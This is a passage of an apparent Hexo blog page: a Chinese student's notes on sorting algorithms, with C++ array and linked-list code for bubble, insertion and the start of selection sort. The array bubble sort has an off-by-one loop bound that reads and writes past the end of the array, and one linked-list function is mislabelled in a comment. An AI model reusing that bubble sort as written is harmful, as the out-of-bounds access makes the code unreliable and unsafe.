<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-排序算法总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/19/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2019-11-19T05:38:09.000Z" itemprop="datePublished">2019-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/19/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/">排序算法总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>总结一下,最近老师上课讲的排序算法……毕竟上课没认真听,就得自己花点时间了…..</p>
<p>参考:<a href="https://blog.csdn.net/dongfei2033/article/details/79938651" target="_blank" rel="noopener"><a href="https://blog.csdn.net/dongfei2033/article/details/79938651" target="_blank" rel="noopener">https://blog.csdn.net/dongfei2033/article/details/79938651</a></a></p>
<p><img src="/.com//1.png" alt="1574086817059"></p>
<h1 id="2-排序算法"><a href="#2-排序算法" class="headerlink" title="2 排序算法"></a>2 排序算法</h1><h2 id="2-1-冒泡排序"><a href="#2-1-冒泡排序" class="headerlink" title="2.1 冒泡排序"></a>2.1 冒泡排序</h2><h3 id="2-1-1-数组实现"><a href="#2-1-1-数组实现" class="headerlink" title="2.1.1 数组实现"></a>2.1.1 数组实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bublletSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> temp;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len<span class="number">-1</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len-i;j++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">           temp = a[j];</span><br><span class="line">           a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">           a[j+<span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-1-2-链表实现"><a href="#2-1-2-链表实现" class="headerlink" title="2.1.2 链表实现"></a>2.1.2 链表实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;typeinfo&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_CODE -999 <span class="comment">//链表结点'数据录入'结束标志！</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(0)元素(结点)类型 */</span></span><br><span class="line"><span class="comment">/*(0.1)单一元素 */</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">int</span>  ElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*(0.2)混合元素 -&gt; 通过结构体进行定义 */</span></span><br><span class="line"><span class="comment">//typedef struct &#123; //此部分：根据实际问题进行定义...</span></span><br><span class="line"><span class="comment">//	float  coef;   /*系数部分*/</span></span><br><span class="line"><span class="comment">//	int    expn;   /*指数部分*/</span></span><br><span class="line"><span class="comment">//&#125; ElemType;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(1)单链表结点 定义*/</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span> &#123;</span></span><br><span class="line">	ElemType  data;     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span>  *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; LNode; <span class="comment">/*结点的类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span></span>; <span class="comment">//函数声明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(2.1)【头插入法】创建单链表,链表的头结点head作为返回值 */</span></span><br><span class="line"><span class="function">LNode *<span class="title">create_LinkList_H</span><span class="params">( )</span> </span>&#123;</span><br><span class="line">	LNode *head, *q; <span class="comment">//head-头结点; q-待插入结点指针</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//(A)创建只有头结点head的: '空单链表'</span></span><br><span class="line">	head = <span class="keyword">new</span> LNode; <span class="comment">//head = (LNode *) malloc( sizeof(LNode) );</span></span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)录入链表各结点的数据, 并钩链</span></span><br><span class="line">	ElemType data;  <span class="comment">//线性表 结点的数据域</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"input data : "</span>&lt;&lt;END_CODE&lt;&lt;<span class="string">" to stop!\n"</span>;</span><br><span class="line">	<span class="keyword">while</span>( <span class="literal">true</span> ) &#123; <span class="comment">//无限循环, 只到停止输入...</span></span><br><span class="line">		<span class="comment">//(a)键盘输入一个链表结点数据--&gt;data</span></span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; data; <span class="comment">//scanf("%d", &amp;data);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)若录入数据data == '数据录入'结束标志END_CODE,则完成链表创建！</span></span><br><span class="line">		<span class="keyword">if</span>( data == END_CODE ) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(c)录入的链表结点数据'data'有效, 则创建一个链表结点存储此数据</span></span><br><span class="line">		q = <span class="keyword">new</span> LNode; <span class="comment">//q = (LNode *)malloc(sizeof(LNode)); //新建'链表结点'</span></span><br><span class="line">		q-&gt;data = data;	<span class="comment">//数据域赋值</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(d)钩链: 新创建的结点q总是作为第一个结点</span></span><br><span class="line">		q-&gt;next = head-&gt;next;</span><br><span class="line">		head-&gt;next = q;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(e)信息提示: 结点创建成功! 并显示当前链表的内容信息！！！</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Node"</span> &lt;&lt; q-&gt;data &lt;&lt; <span class="string">"create successfully!\n"</span>;</span><br><span class="line">		<span class="comment">//show(head); //显示当前的链表</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(C)返回此单链表的'头结点head'</span></span><br><span class="line">	<span class="keyword">return</span> (head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbletSort</span><span class="params">(LNode *head)</span><span class="comment">//简单选择排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LNode *p,*q;</span><br><span class="line">	<span class="keyword">int</span> s;</span><br><span class="line">    <span class="keyword">for</span>(p=head-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)</span><br><span class="line">      <span class="keyword">for</span>(q=p-&gt;next;q!=<span class="literal">NULL</span>;q=q-&gt;next)</span><br><span class="line">        <span class="keyword">if</span>((p-&gt;data)&gt;(q-&gt;data))</span><br><span class="line">         &#123;</span><br><span class="line">            s=p-&gt;data;</span><br><span class="line">            p-&gt;data = q-&gt;data;</span><br><span class="line">            q-&gt;data = s;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//(A)单链表为NULL空</span></span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"linklist: empty!!!\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)输出以L为头结点的单链表的各个结点的数据格式:"顺序表:--&gt;e1-&gt;e2-&gt;...-&gt;en"</span></span><br><span class="line">	LNode *q = L-&gt;next; <span class="comment">//q指向L的下一结点</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"number: "</span>;</span><br><span class="line">	<span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123; <span class="comment">//循环,以输出各结点的数据</span></span><br><span class="line">		<span class="comment">//(a)输出结点数据</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; q-&gt;data;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)下一个结点</span></span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//链表输出结束-换行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *head = create_LinkList_H();</span><br><span class="line">    show(head);</span><br><span class="line">    BubbletSort(head);</span><br><span class="line">    show(head);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-2-插入排序"><a href="#2-2-插入排序" class="headerlink" title="2.2 插入排序"></a>2.2 插入排序</h2><h3 id="2-2-1-数组实现"><a href="#2-2-1-数组实现" class="headerlink" title="2.2.1 数组实现"></a>2.2.1 数组实现</h3><p>原理参考链接:<a href="https://blog.csdn.net/huangyimo/article/details/80888999" target="_blank" rel="noopener">直接插入排序(数组实现)</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">int</span> key=a[i];<span class="comment">//key 为哨兵 待插入的数据放入哨兵中</span></span><br><span class="line">      <span class="keyword">int</span> j=i<span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;a[j]&gt;key)<span class="comment">//从哨兵开始从右往左开始遍历</span></span><br><span class="line">      &#123;</span><br><span class="line">         a[j+<span class="number">1</span>] = a[j];<span class="comment">//数据往后移动一个位置</span></span><br><span class="line">         j--;<span class="comment">//从key开始遍历,j--表示往前移动一个位置,直至寻找到一个a[j]小于key</span></span><br><span class="line">      &#125;</span><br><span class="line">      a[j+<span class="number">1</span>] = key;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123; <span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line">	insertSort(a,n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-2-2-链表实现"><a href="#2-2-2-链表实现" class="headerlink" title="2.2.2 链表实现"></a>2.2.2 链表实现</h3><p>主要思想和使用数组实现是一个道理,但是感觉比数组要不好理解一点</p>
<p>代码如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;typeinfo&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_CODE -999 <span class="comment">//链表结点'数据录入'结束标志！</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">int</span>  ElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*(1)单链表结点 定义*/</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span> &#123;</span></span><br><span class="line">	ElemType  data;     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span>  *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; LNode; <span class="comment">/*结点的类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span></span>; <span class="comment">//函数声明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(2.1)【头插入法】创建单链表,链表的头结点head作为返回值 */</span></span><br><span class="line"><span class="function">LNode *<span class="title">create_LinkList_H</span><span class="params">( )</span> </span>&#123;</span><br><span class="line">	LNode *head, *q; <span class="comment">//head-头结点; q-待插入结点指针</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//(A)创建只有头结点head的: '空单链表'</span></span><br><span class="line">	head = <span class="keyword">new</span> LNode; <span class="comment">//head = (LNode *) malloc( sizeof(LNode) );</span></span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)录入链表各结点的数据, 并钩链</span></span><br><span class="line">	ElemType data;  <span class="comment">//线性表 结点的数据域</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"input data : "</span>&lt;&lt;END_CODE&lt;&lt;<span class="string">" to stop!\n"</span>;</span><br><span class="line">	<span class="keyword">while</span>( <span class="literal">true</span> ) &#123; <span class="comment">//无限循环, 只到停止输入...</span></span><br><span class="line">		<span class="comment">//(a)键盘输入一个链表结点数据--&gt;data</span></span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; data; <span class="comment">//scanf("%d", &amp;data);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)若录入数据data == '数据录入'结束标志END_CODE,则完成链表创建！</span></span><br><span class="line">		<span class="keyword">if</span>( data == END_CODE ) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(c)录入的链表结点数据'data'有效, 则创建一个链表结点存储此数据</span></span><br><span class="line">		q = <span class="keyword">new</span> LNode; <span class="comment">//q = (LNode *)malloc(sizeof(LNode)); //新建'链表结点'</span></span><br><span class="line">		q-&gt;data = data;	<span class="comment">//数据域赋值</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(d)钩链: 新创建的结点q总是作为第一个结点</span></span><br><span class="line">		q-&gt;next = head-&gt;next;</span><br><span class="line">		head-&gt;next = q;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(e)信息提示: 结点创建成功! 并显示当前链表的内容信息！！！</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Node"</span> &lt;&lt; q-&gt;data &lt;&lt; <span class="string">"create successfully!\n"</span>;</span><br><span class="line">		<span class="comment">//show(head); //显示当前的链表</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(C)返回此单链表的'头结点head'</span></span><br><span class="line">	<span class="keyword">return</span> (head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(LNode *L)</span></span>&#123;</span><br><span class="line">   LNode *p,*r,*q;</span><br><span class="line">   p=L-&gt;next;</span><br><span class="line">   q=p-&gt;next;<span class="comment">//q保存p的后继</span></span><br><span class="line">   p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   p=q;</span><br><span class="line">   <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">     q=p-&gt;next;</span><br><span class="line">     r=L;</span><br><span class="line">     <span class="keyword">while</span>(r-&gt;next!=<span class="literal">NULL</span>&amp;&amp;r-&gt;next-&gt;data&lt;p-&gt;data)&#123;</span><br><span class="line">        r=r-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">     p-&gt;next = r-&gt;next;</span><br><span class="line">     r-&gt;next = p;</span><br><span class="line">     p=q;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//(A)单链表为NULL空</span></span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"linklist: empty!!!\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)输出以L为头结点的单链表的各个结点的数据格式:"顺序表:--&gt;e1-&gt;e2-&gt;...-&gt;en"</span></span><br><span class="line">	LNode *q = L-&gt;next; <span class="comment">//q指向L的下一结点</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"number: "</span>;</span><br><span class="line">	<span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123; <span class="comment">//循环,以输出各结点的数据</span></span><br><span class="line">		<span class="comment">//(a)输出结点数据</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; q-&gt;data;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)下一个结点</span></span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//链表输出结束-换行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *head = create_LinkList_H();</span><br><span class="line">    show(head);</span><br><span class="line">    InsertSort(head);</span><br><span class="line">    show(head);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="2-3-选择排序"><a href="#2-3-选择排序" class="headerlink" title="2.3 选择排序"></a>2.3 选择排序</h2><h3 id="2-3-1-数组实现"><a href="#2-3-1-数组实现" class="headerlink" title="2.3.1 数组实现"></a>2.3.1 数组实现</h3><p>原理参考:<a href="https://blog.csdn.net/weixin_41362649/article/details/81901091" target="_blank" rel="noopener">选择排序(数组实现)</a></p>
<p>实际上选择排序是冒泡排序的升级版…..</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> minindex,temp;<span class="comment">//minindex-哨兵  temp-暂存空间</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      minindex=i;<span class="comment">//设置哨兵为当前位置元素</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(a[j]&lt;a[minindex]) minindex=j;<span class="comment">//从左往右遍历哨兵(当前位置元素)往右的元素</span></span><br><span class="line">                                         <span 